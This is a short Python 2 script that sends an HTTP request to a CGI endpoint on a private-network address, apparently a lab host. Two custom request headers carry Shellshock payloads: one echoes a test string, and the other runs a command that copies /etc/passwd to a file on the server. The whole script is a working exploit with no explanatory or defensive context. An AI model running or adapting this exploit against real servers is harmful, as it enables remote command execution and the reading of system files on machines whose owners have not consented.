#coding=utf-8
import urllib, urllib2
import cookielib, socket
import cgi, re, os

def get_request(url):
    socket.setdefaulttimeout(5)
    i_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
                 "CustomHeader": "() { test;};echo; echo; echo shellshock one;",                            
                 "CustomHeader2": "() { :; }; /bin/cat /etc/passwd > ./shellshock2.txt",                 
                 }

    req = urllib2.Request(url, headers=i_headers)
    response = urllib2.urlopen(req)
    print response.info()
    html = response.read()
    print html

url = "http://192.168.91.135:8080/hello/cgi-bin/hello"
get_request(url)
